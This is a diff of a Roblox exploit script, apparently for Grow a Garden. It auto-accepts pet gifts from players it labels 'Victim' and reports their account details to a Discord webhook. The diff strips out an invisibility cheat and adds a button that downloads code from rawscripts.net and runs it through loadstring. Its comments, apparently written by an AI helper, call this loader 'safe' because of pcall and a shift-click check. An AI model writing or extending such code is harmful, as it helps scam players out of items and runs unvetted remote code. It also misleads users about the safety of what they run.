@@ -7,7 +7,8 @@
 --  - Notifications on load
 --  - Leave button (kick)
 --  - Safe http webhook using HttpService 
--- - tween cbring player
+--  - tween cbring player
+--  - Optional: load external "Invisible" script (executed via a safe button with pcall)
 
 -- Services / globals
 local Players = game:GetService("Players")
@@ -25,11 +26,11 @@ local function sendWebhook(content)
     if not WebhookURL or WebhookURL == "" then return end
     local data = {
         username = "🎁 GAG HITS TP",
-        avatar_url = "https://i.imgur.com/vkDcdge.png", -- Anime avatar, change if you want
+        avatar_url = "https://i.imgur.com/vkDcdge.png",
         embeds = {{
             title = "🎉 Auto Accepted Gift!",
             description = content,
-            color = 0xFFD580, -- Hot pink, change to any hex color (e.g. 0x00FF99 for green)
+            color = 0xFFD580,
             footer = { text = "Joshhub | TELEPORTER⚡" }
         }}
     }
@@ -405,7 +406,7 @@ for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
 
                     -- Webhook message
                     local msg = string.format(
-                        "```🎁 Auto Accepted Gift!\n👤 Victim🤣: %s\n📅 VICTIM Age acc: %s\n🆔 GiftID: %s\n🐾 Pet: %s\n📌 Receiver: %s```",
+                        "```🎁 Auto Accepted Gift!\n👤 Victim🤣: %s\n📅 VICTIM Age acc: %s\n🆔 GiftID: %s\n🐾 Pet: %s\n📌 Receiver: %s``",
                         tostring(sender), accountAge, tostring(giftId), petFinal, LocalPlayer.Name
                     )
 
@@ -471,16 +472,6 @@ local function makeDraggable(button)
     end)
 end
 
---// INVISIBLE Button (upper-left, maliit at mas mataas)
-local toggleButton = Instance.new("TextButton", screenGui)
-toggleButton.Size = UDim2.new(0, 90, 0, 28)
-toggleButton.Position = UDim2.new(0, 15, 0, 20) -- mas mataas na position
-toggleButton.Text = "INVISIBLE"
-toggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-toggleButton.Font = Enum.Font.SourceSansBold
-toggleButton.TextScaled = true
-makeDraggable(toggleButton)
 
 --// SPEED BOOST Button (upper-right, maliit at mas mataas)
 local speedButton = Instance.new("TextButton", screenGui)
@@ -507,43 +498,6 @@ local function setTransparency(character, transparency)
     end
 end
 
---// Toggle Invisibility
-local function toggleInvisibility()
-    invis_on = not invis_on
-    sound:Play()
-    if invis_on then
-        local savedpos = player.Character.HumanoidRootPart.CFrame
-        task.wait()
-        player.Character:MoveTo(Vector3.new(-25.95, 84, 3537.55))
-        task.wait(0.15)
-        local Seat = Instance.new('Seat', workspace)
-        Seat.Anchored = false
-        Seat.CanCollide = false
-        Seat.Name = 'invischair'
-        Seat.Transparency = 1
-        Seat.Position = Vector3.new(-25.95, 84, 3537.55)
-        local Weld = Instance.new("Weld", Seat)
-        Weld.Part0 = Seat
-        Weld.Part1 = player.Character:FindFirstChild("Torso") or player.Character.UpperTorso
-        task.wait()
-        Seat.CFrame = savedpos
-        setTransparency(player.Character, 0.5)
-        game.StarterGui:SetCore("SendNotification", {
-            Title = "Invis (on)",
-            Duration = 3,
-            Text = "STATUS:"
-        })
-    else
-        local invisChair = workspace:FindFirstChild('invischair')
-        if invisChair then invisChair:Destroy() end
-        setTransparency(player.Character, 0)
-        game.StarterGui:SetCore("SendNotification", {
-            Title = "Invis (off)",
-            Duration = 3,
-            Text = "STATUS:"
-        })
-    end
-end
 
 --// Toggle Speed Boost
 local function toggleSpeedBoost()
@@ -572,7 +526,6 @@ local function toggleSpeedBoost()
 end
 
 --// Button connections
-toggleButton.MouseButton1Click:Connect(toggleInvisibility)
 speedButton.MouseButton1Click:Connect(toggleSpeedBoost)
 
 --// Reset speed after respawn
@@ -591,3 +544,93 @@ pcall(function()
         Duration = 5
     })
 end)
+
+-- -----------------------------
+-- External Invisible Script Loader
+-- -----------------------------
+-- The original line requested: loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invisible-script-20557"))()
+-- Instead of auto-executing on load, we add a safe button that runs the external script with pcall.
+-- WHY: executing remote code automatically can be dangerous. This gives you control to run it when you want.
+
+local ExternalScriptURL = "https://rawscripts.net/raw/Universal-Script-Invisible-script-20557"
+
+local LoadInvButton = Instance.new("TextButton")
+LoadInvButton.Size = UDim2.new(1, -20, 0, 28)
+LoadInvButton.Position = UDim2.new(0, 10, 1, -98)
+LoadInvButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+LoadInvButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoadInvButton.Text = "🔒 LOAD INVISIBLE SCRIPT"
+LoadInvButton.Font = Enum.Font.SourceSansBold
+LoadInvButton.TextSize = 12
+LoadInvButton.Parent = MainFrame
+Instance.new("UICorner", LoadInvButton).CornerRadius = UDim.new(0, 6)
+
+local function tryLoadExternalScript()
+    -- Safety: notify, then attempt to fetch+run the script inside pcall
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "External Script",
+        Text = "Attempting to load external script...",
+        Duration = 3
+    })
+
+    local success, err = pcall(function()
+        -- prefer game:HttpGet if available, otherwise try syn.http.request or other envs
+        local raw
+        if type(game.HttpGet) == "function" then
+            raw = game:HttpGet(ExternalScriptURL)
+        elseif request then
+            raw = request({Url = ExternalScriptURL, Method = "GET"}).Body
+        elseif syn and syn.request then
+            raw = syn.request({Url = ExternalScriptURL, Method = "GET"}).Body
+        else
+            -- fallback to HttpService if allowed
+            raw = HttpService:GetAsync(ExternalScriptURL)
+        end
+
+        if raw and #raw > 0 then
+            local f, loadErr = loadstring(raw)
+            if not f then error("loadstring error: "..tostring(loadErr)) end
+            -- execute inside pcall
+            local ok, runErr = pcall(f)
+            if not ok then error("external script runtime error: "..tostring(runErr)) end
+        else
+            error("failed to fetch external script or empty response")
+        end
+    end)
+
+    if success then
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "External Script",
+            Text = "External script executed (no errors).",
+            Duration = 4
+        })
+        -- disable button so user won't re-run it accidentally
+        LoadInvButton.Text = "✅ LOADED"
+        LoadInvButton.BackgroundColor3 = Color3.fromRGB(20, 120, 20)
+        LoadInvButton.Active = false
+        LoadInvButton.AutoButtonColor = false
+    else
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "External Script Error",
+            Text = tostring(err or "Unknown error while loading"),
+            Duration = 6
+        })
+    end
+end
+
+LoadInvButton.MouseButton1Click:Connect(function()
+    -- Extra confirmation: require pressing shift while clicking to reduce accidental runs
+    local shiftDown = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsKeyDown(Enum.KeyCode.RightShift)
+    if not shiftDown then
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Confirmation required",
+            Text = "Hold SHIFT and click to confirm running external script.",
+            Duration = 3
+        })
+        return
+    end
+
+    tryLoadExternalScript()
+end)
+
+-- End of script
